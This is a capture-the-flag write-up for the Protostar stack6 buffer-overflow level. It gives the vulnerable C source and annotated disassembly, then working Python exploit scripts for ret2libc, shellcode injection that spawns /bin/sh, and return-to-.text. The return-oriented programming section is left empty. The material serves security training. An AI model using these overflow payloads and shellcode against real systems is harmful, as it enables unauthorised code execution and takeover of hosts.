
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
                                      Hints
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Stack6 looks at what happens when you have restrictions on the return address.

This level can be done in a couple of ways, 
such as finding the duplicate of the payload (objdump -s) will help with this), or ret2libc, or even return orientated programming.

It is strongly suggested you experiment with multiple ways of getting your code to execute here.

This level is at /opt/protostar/bin/stack6


+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
                                          Source Code : 
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();



}



+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
                                          Ret2libc _ Custom Environment 
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Disassembly :
0x08048484 <getpath+0>:	push   ebp
0x08048485 <getpath+1>:	mov    ebp,esp
0x08048487 <getpath+3>:	sub    esp,0x68                     << ==== Create Buffer Space
0x0804848a <getpath+6>:	mov    eax,0x80485d0                << ====  Load Printing Text On EAX
0x0804848f <getpath+11>:	mov    DWORD PTR [esp],eax      << ==== Place it at the Top of Stack
0x08048492 <getpath+14>:	call   0x80483c0 <printf@plt>   << ==== Call Print Function
0x08048497 <getpath+19>:	mov    eax,ds:0x8049720         << ==== Load Value On Eax
0x0804849c <getpath+24>:	mov    DWORD PTR [esp],eax      << ==== Place it at the Top Of Stack
0x0804849f <getpath+27>:	call   0x80483b0 <fflush@plt>   << ==== Call Flush FUnction
0x080484a4 <getpath+32>:	lea    eax,[ebp-0x4c]           << ==== Load Starting Address Of Bufer Variable 
0x080484a7 <getpath+35>:	mov    DWORD PTR [esp],eax      << ==== Place it at the Top of Stack
0x080484aa <getpath+38>:	call   0x8048380 <gets@plt>     << ==== Call Get Function
0x080484af <getpath+43>:	mov    eax,DWORD PTR [ebp+0x4]  << ==== Load Return address Of Current Allocated stack queue Onto EAX
0x080484b2 <getpath+46>:	mov    DWORD PTR [ebp-0xc],eax  << ==== Move EAX return address to variable space on stack
0x080484b5 <getpath+49>:	mov    eax,DWORD PTR [ebp-0xc]  << ==== Load Return address of current allocated stack queue Onto EAX
0x080484b8 <getpath+52>:	and    eax,0xbf000000           << ==== and function 
0x080484bd <getpath+57>:	cmp    eax,0xbf000000           << ==== Compare EAX and Value
0x080484c2 <getpath+62>:	jne    0x80484e4 <getpath+96>   << ==== Jump WHen Not Equal
0x080484c4 <getpath+64>:	mov    eax,0x80485e4            << ==== Load Printable String Starting Address at EAX
0x080484c9 <getpath+69>:	mov    edx,DWORD PTR [ebp-0xc]  << ==== Load RETURN address value on Edx
0x080484cc <getpath+72>:	mov    DWORD PTR [esp+0x4],edx  << ==== Load EDX value at the top second place of stack
0x080484d0 <getpath+76>:	mov    DWORD PTR [esp],eax      << ==== Load Eax value at the top of stack
0x080484d3 <getpath+79>:	call   0x80483c0 <printf@plt>   << ==== Call Print Function
0x080484d8 <getpath+84>:	mov    DWORD PTR [esp],0x1      << ==== EXit Function Argument
0x080484df <getpath+91>:	call   0x80483a0 <_exit@plt>    << ==== Call Exit Function
0x080484e4 <getpath+96>:	mov    eax,0x80485f0            << ==== Load Printable String Starting Address at EAX
0x080484e9 <getpath+101>:	lea    edx,[ebp-0x4c]           << ==== Load Starting Address Of Bufer Variable 
0x080484ec <getpath+104>:	mov    DWORD PTR [esp+0x4],edx  << ==== Load EDX value at the top second place of stack
0x080484f0 <getpath+108>:	mov    DWORD PTR [esp],eax      << ==== Load Eax value at the top of stack
0x080484f3 <getpath+111>:	call   0x80483c0 <printf@plt>   << ==== Call Print Function
0x080484f8 <getpath+116>:	leave                           << ==== Reverse Of (push   ebp; mov    ebp,esp)
0x080484f9 <getpath+117>:	ret                             << ==== Return Value


Concept:


 0                  28                                                     104
 =============================================================================
 | Other Stuff      |         Focus Here (Get Will Inject here)             |
==============================================================================




 (28+0)                 (28+72)   (28+76)    (28+80)    (28+84)
  ========================================================================================
 | Total Buffer Space (72) |    Pads |    EBP   |    EIP   |   EXIT Call   |  /bin/sh     | 
==========================================================================================

EIP         : Point To System Call (Located On Libc)
EXIT        : System Call Return Pointer Address (But We are again using it as next call From LIbc)
/bin/sh     : Use as Argument For System Call (Custom Environment)

To find Address Use GDB p command like

(gdb) p system
(gdb) p exit


Or use readelf and grep
# root@protostar:/opt/protostar# readelf -s "/lib/libc-2.11.2.so" | grep "system"
#   238: 000f29d0    66 FUNC    GLOBAL DEFAULT   12 svcerr_systemerr@@GLIBC_2.0
#   606: 00038fb0   125 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE
#  1399: 00038fb0   125 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0



#  readelf -s "/lib/libc-2.11.2.so" | grep "exit"
# strings -a -t x "/lib/libc-2.11.2.so" | grep "/bin/sh"


C Environment:

// Create A Dummy Variable On Environment and Get Address Of it

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>



int main(int argc, char **argv)
	{
 	char *ptr = getenv("EGG");
 	if (ptr != NULL)
 		{
 		printf("Estimated address: %p\n", ptr);
 		return 0;
 	}
 	printf("Setting up environment...\nRun Again This Scrit Under This Environmet To Get Address\n");
 	setenv("EGG", "/bin/sh", 1);
 	execl("/bin/sh", (char *)NULL);
}




Exploit:

#!/usr/bin/python
import struct

# Run This Payload On Custom Environment (/bin/sh)
#
# Exploiting Payload Configurations
#
buff = "A"*72     # buffer Size 
esp = "DDDD"      # Probabily Paddings also
ebp = "BBBB"      # EBP 
eip = "CCCC"      # EIP

# Please Conform Below Addresses
system_call = 0xb7ecffb0    # System Call
exit_call   = 0xb7ec60c0    # Exit Call
binsh_addr  = 0xbfffffa4    # bin/sh



eip = struct.pack("I", system_call)


payload = buff + esp + ebp + eip + struct.pack('I', exit_call) + struct.pack('I', binsh_addr - 0x4)

print payload



+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
                                          Return To Libc 
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Disassembly :
0x08048484 <getpath+0>:	push   ebp
0x08048485 <getpath+1>:	mov    ebp,esp
0x08048487 <getpath+3>:	sub    esp,0x68                     << ==== Create Buffer Space
0x0804848a <getpath+6>:	mov    eax,0x80485d0                << ====  Load Printing Text On EAX
0x0804848f <getpath+11>:	mov    DWORD PTR [esp],eax      << ==== Place it at the Top of Stack
0x08048492 <getpath+14>:	call   0x80483c0 <printf@plt>   << ==== Call Print Function
0x08048497 <getpath+19>:	mov    eax,ds:0x8049720         << ==== Load Value On Eax
0x0804849c <getpath+24>:	mov    DWORD PTR [esp],eax      << ==== Place it at the Top Of Stack
0x0804849f <getpath+27>:	call   0x80483b0 <fflush@plt>   << ==== Call Flush FUnction
0x080484a4 <getpath+32>:	lea    eax,[ebp-0x4c]           << ==== Load Starting Address Of Bufer Variable 
0x080484a7 <getpath+35>:	mov    DWORD PTR [esp],eax      << ==== Place it at the Top of Stack
0x080484aa <getpath+38>:	call   0x8048380 <gets@plt>     << ==== Call Get Function
0x080484af <getpath+43>:	mov    eax,DWORD PTR [ebp+0x4]  << ==== Load Return address Of Current Allocated stack queue Onto EAX
0x080484b2 <getpath+46>:	mov    DWORD PTR [ebp-0xc],eax  << ==== Move EAX return address to variable space on stack
0x080484b5 <getpath+49>:	mov    eax,DWORD PTR [ebp-0xc]  << ==== Load Return address of current allocated stack queue Onto EAX
0x080484b8 <getpath+52>:	and    eax,0xbf000000           << ==== and function 
0x080484bd <getpath+57>:	cmp    eax,0xbf000000           << ==== Compare EAX and Value
0x080484c2 <getpath+62>:	jne    0x80484e4 <getpath+96>   << ==== Jump WHen Not Equal
0x080484c4 <getpath+64>:	mov    eax,0x80485e4            << ==== Load Printable String Starting Address at EAX
0x080484c9 <getpath+69>:	mov    edx,DWORD PTR [ebp-0xc]  << ==== Load RETURN address value on Edx
0x080484cc <getpath+72>:	mov    DWORD PTR [esp+0x4],edx  << ==== Load EDX value at the top second place of stack
0x080484d0 <getpath+76>:	mov    DWORD PTR [esp],eax      << ==== Load Eax value at the top of stack
0x080484d3 <getpath+79>:	call   0x80483c0 <printf@plt>   << ==== Call Print Function
0x080484d8 <getpath+84>:	mov    DWORD PTR [esp],0x1      << ==== EXit Function Argument
0x080484df <getpath+91>:	call   0x80483a0 <_exit@plt>    << ==== Call Exit Function
0x080484e4 <getpath+96>:	mov    eax,0x80485f0            << ==== Load Printable String Starting Address at EAX
0x080484e9 <getpath+101>:	lea    edx,[ebp-0x4c]           << ==== Load Starting Address Of Bufer Variable 
0x080484ec <getpath+104>:	mov    DWORD PTR [esp+0x4],edx  << ==== Load EDX value at the top second place of stack
0x080484f0 <getpath+108>:	mov    DWORD PTR [esp],eax      << ==== Load Eax value at the top of stack
0x080484f3 <getpath+111>:	call   0x80483c0 <printf@plt>   << ==== Call Print Function
0x080484f8 <getpath+116>:	leave                           << ==== Reverse Of (push   ebp; mov    ebp,esp)
0x080484f9 <getpath+117>:	ret                             << ==== Return Value


Concept:


 0                  28                                                     104
 =============================================================================
 | Other Stuff      |         Focus Here (Get Will Inject here)             |
==============================================================================




 (28+0)                 (28+72)   (28+76)    (28+80)    (28+84)
  ========================================================================================
 | Total Buffer Space (72) |    Pads |    EBP   |    EIP   |   EXIT Call   |  /bin/sh     | 
==========================================================================================

EIP         : Point To System Call (Located On Libc)
EXIT        : System Call Return Pointer Address (But We are again using it as next call From LIbc)
/bin/sh     : Use as Argument For System Call (Located On Libc)

To find Address Use GDB p command like

(gdb) p system
(gdb) p exit


Or use readelf and grep
# root@protostar:/opt/protostar# readelf -s "/lib/libc-2.11.2.so" | grep "system"
#   238: 000f29d0    66 FUNC    GLOBAL DEFAULT   12 svcerr_systemerr@@GLIBC_2.0
#   606: 00038fb0   125 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE
#  1399: 00038fb0   125 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0



#  readelf -s "/lib/libc-2.11.2.so" | grep "exit"
# strings -a -t x "/lib/libc-2.11.2.so" | grep "/bin/sh"

Exploit:

#!/usr/bin/python
import struct

# Run This Payload On Custom Environment (/bin/sh)
#
# Exploiting Payload Configurations
#
buff = "A"*72     # buffer Size 
esp = "DDDD"      # Probabily Paddings also
ebp = "BBBB"      # EBP 
eip = "CCCC"      # EIP

# Please Conform Below Addresses
system_call = 0xb7ecffb0    # System Call
exit_call   = 0xb7ec60c0    # Exit Call
binsh_addr  = 0xbfffffa4    # bin/sh



eip = struct.pack("I", system_call)


payload = buff + esp + ebp + eip + struct.pack('I', exit_call) + struct.pack('I', binsh_addr - 0x4)

print payload

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
                                          Duplicate Code Execution 
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


Disassembly:
0x08048484 <getpath+0>:	push   ebp
0x08048485 <getpath+1>:	mov    ebp,esp
0x08048487 <getpath+3>:	sub    esp,0x68
0x0804848a <getpath+6>:	mov    eax,0x80485d0
0x0804848f <getpath+11>:	mov    DWORD PTR [esp],eax
0x08048492 <getpath+14>:	call   0x80483c0 <printf@plt>
0x08048497 <getpath+19>:	mov    eax,ds:0x8049720
0x0804849c <getpath+24>:	mov    DWORD PTR [esp],eax
0x0804849f <getpath+27>:	call   0x80483b0 <fflush@plt>
0x080484a4 <getpath+32>:	lea    eax,[ebp-0x4c]
0x080484a7 <getpath+35>:	mov    DWORD PTR [esp],eax
0x080484aa <getpath+38>:	call   0x8048380 <gets@plt>
0x080484af <getpath+43>:	mov    eax,DWORD PTR [ebp+0x4]
0x080484b2 <getpath+46>:	mov    DWORD PTR [ebp-0xc],eax
0x080484b5 <getpath+49>:	mov    eax,DWORD PTR [ebp-0xc]
0x080484b8 <getpath+52>:	and    eax,0xbf000000
0x080484bd <getpath+57>:	cmp    eax,0xbf000000
0x080484c2 <getpath+62>:	jne    0x80484e4 <getpath+96>
0x080484c4 <getpath+64>:	mov    eax,0x80485e4
0x080484c9 <getpath+69>:	mov    edx,DWORD PTR [ebp-0xc]
0x080484cc <getpath+72>:	mov    DWORD PTR [esp+0x4],edx
0x080484d0 <getpath+76>:	mov    DWORD PTR [esp],eax
0x080484d3 <getpath+79>:	call   0x80483c0 <printf@plt>
0x080484d8 <getpath+84>:	mov    DWORD PTR [esp],0x1
0x080484df <getpath+91>:	call   0x80483a0 <_exit@plt>
0x080484e4 <getpath+96>:	mov    eax,0x80485f0
0x080484e9 <getpath+101>:	lea    edx,[ebp-0x4c]
0x080484ec <getpath+104>:	mov    DWORD PTR [esp+0x4],edx
0x080484f0 <getpath+108>:	mov    DWORD PTR [esp],eax
0x080484f3 <getpath+111>:	call   0x80483c0 <printf@plt>
0x080484f8 <getpath+116>:	leave  
0x080484f9 <getpath+117>:	ret 


Concept
Because We can't use stack to execute because of restrictions. so, we will use memory address of inserted data.
..
Well, 
# ulimit -c unlimited

and Crash App with Overflow.

Use objdump -s "core.crash.file"



Exploit:

#!/usr/bin/python

import struct

daddr = 0xb7fde000 + 0x10

buff = len("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB")


#shellcode = "\x90"*10+'\xcc'
shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"\x90"*8



eip = struct.pack("I", daddr)  


shell = '\x90'*(buff-len(shellcode))+shellcode
#print len(shell)
payload =  shell + eip

print payload






+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
                                          Return to Text Execution 
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Disassembly:
0x08048484 <getpath+0>:	push   ebp
0x08048485 <getpath+1>:	mov    ebp,esp
0x08048487 <getpath+3>:	sub    esp,0x68
0x0804848a <getpath+6>:	mov    eax,0x80485d0
0x0804848f <getpath+11>:	mov    DWORD PTR [esp],eax
0x08048492 <getpath+14>:	call   0x80483c0 <printf@plt>
0x08048497 <getpath+19>:	mov    eax,ds:0x8049720
0x0804849c <getpath+24>:	mov    DWORD PTR [esp],eax
0x0804849f <getpath+27>:	call   0x80483b0 <fflush@plt>
0x080484a4 <getpath+32>:	lea    eax,[ebp-0x4c]
0x080484a7 <getpath+35>:	mov    DWORD PTR [esp],eax
0x080484aa <getpath+38>:	call   0x8048380 <gets@plt>
0x080484af <getpath+43>:	mov    eax,DWORD PTR [ebp+0x4]
0x080484b2 <getpath+46>:	mov    DWORD PTR [ebp-0xc],eax
0x080484b5 <getpath+49>:	mov    eax,DWORD PTR [ebp-0xc]
0x080484b8 <getpath+52>:	and    eax,0xbf000000
0x080484bd <getpath+57>:	cmp    eax,0xbf000000
0x080484c2 <getpath+62>:	jne    0x80484e4 <getpath+96>
0x080484c4 <getpath+64>:	mov    eax,0x80485e4
0x080484c9 <getpath+69>:	mov    edx,DWORD PTR [ebp-0xc]
0x080484cc <getpath+72>:	mov    DWORD PTR [esp+0x4],edx
0x080484d0 <getpath+76>:	mov    DWORD PTR [esp],eax
0x080484d3 <getpath+79>:	call   0x80483c0 <printf@plt>
0x080484d8 <getpath+84>:	mov    DWORD PTR [esp],0x1
0x080484df <getpath+91>:	call   0x80483a0 <_exit@plt>
0x080484e4 <getpath+96>:	mov    eax,0x80485f0
0x080484e9 <getpath+101>:	lea    edx,[ebp-0x4c]
0x080484ec <getpath+104>:	mov    DWORD PTR [esp+0x4],edx
0x080484f0 <getpath+108>:	mov    DWORD PTR [esp],eax
0x080484f3 <getpath+111>:	call   0x80483c0 <printf@plt>
0x080484f8 <getpath+116>:	leave  
0x080484f9 <getpath+117>:	ret 


Exploit:

#!/usr/bin/python
import struct


buf = "a"*80

eip = struct.pack("I",0x080484f9) # Get Path Ret Call address

neip = struct.pack("I",0xbffffce4) # Address To Our Shellcode

# ------------------------------------------------------------------------
# | 'A'*80 | [CurrentFunctionRETInstruction] | PointToStack | Shellcode | 
# ------------------------------------------------------------------------
# After RET Function Code, Machine Will Check For NExt Instruction
# Actually Above RET is Just Point To Instruction and as me know, 
# process always save next instruction as NEW EIP
#
print buf+eip + neip + '\xcc'*40






+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
                                          Return To Object Orient Programming 
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Disassembly:
0x08048484 <getpath+0>:	push   ebp
0x08048485 <getpath+1>:	mov    ebp,esp
0x08048487 <getpath+3>:	sub    esp,0x68
0x0804848a <getpath+6>:	mov    eax,0x80485d0
0x0804848f <getpath+11>:	mov    DWORD PTR [esp],eax
0x08048492 <getpath+14>:	call   0x80483c0 <printf@plt>
0x08048497 <getpath+19>:	mov    eax,ds:0x8049720
0x0804849c <getpath+24>:	mov    DWORD PTR [esp],eax
0x0804849f <getpath+27>:	call   0x80483b0 <fflush@plt>
0x080484a4 <getpath+32>:	lea    eax,[ebp-0x4c]
0x080484a7 <getpath+35>:	mov    DWORD PTR [esp],eax
0x080484aa <getpath+38>:	call   0x8048380 <gets@plt>
0x080484af <getpath+43>:	mov    eax,DWORD PTR [ebp+0x4]
0x080484b2 <getpath+46>:	mov    DWORD PTR [ebp-0xc],eax
0x080484b5 <getpath+49>:	mov    eax,DWORD PTR [ebp-0xc]
0x080484b8 <getpath+52>:	and    eax,0xbf000000
0x080484bd <getpath+57>:	cmp    eax,0xbf000000
0x080484c2 <getpath+62>:	jne    0x80484e4 <getpath+96>
0x080484c4 <getpath+64>:	mov    eax,0x80485e4
0x080484c9 <getpath+69>:	mov    edx,DWORD PTR [ebp-0xc]
0x080484cc <getpath+72>:	mov    DWORD PTR [esp+0x4],edx
0x080484d0 <getpath+76>:	mov    DWORD PTR [esp],eax
0x080484d3 <getpath+79>:	call   0x80483c0 <printf@plt>
0x080484d8 <getpath+84>:	mov    DWORD PTR [esp],0x1
0x080484df <getpath+91>:	call   0x80483a0 <_exit@plt>
0x080484e4 <getpath+96>:	mov    eax,0x80485f0
0x080484e9 <getpath+101>:	lea    edx,[ebp-0x4c]
0x080484ec <getpath+104>:	mov    DWORD PTR [esp+0x4],edx
0x080484f0 <getpath+108>:	mov    DWORD PTR [esp],eax
0x080484f3 <getpath+111>:	call   0x80483c0 <printf@plt>
0x080484f8 <getpath+116>:	leave  
0x080484f9 <getpath+117>:	ret 


Concept


C Environment:


Exploit:





